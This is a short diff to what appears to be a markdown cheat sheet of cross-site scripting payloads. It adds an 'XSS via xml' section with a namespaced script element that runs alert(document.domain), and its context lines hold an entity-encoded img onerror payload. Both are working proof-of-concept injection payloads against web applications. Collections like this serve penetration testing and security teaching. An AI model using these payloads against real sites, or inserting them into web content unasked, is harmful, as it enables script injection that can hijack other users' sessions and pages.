@@ -134,3 +134,8 @@ can also work with single quotes (change it in the payload)
 ```js
 &quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
 ```
+
+## XSS via xml
+```xml
+<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(document.domain)</a:script>
+```
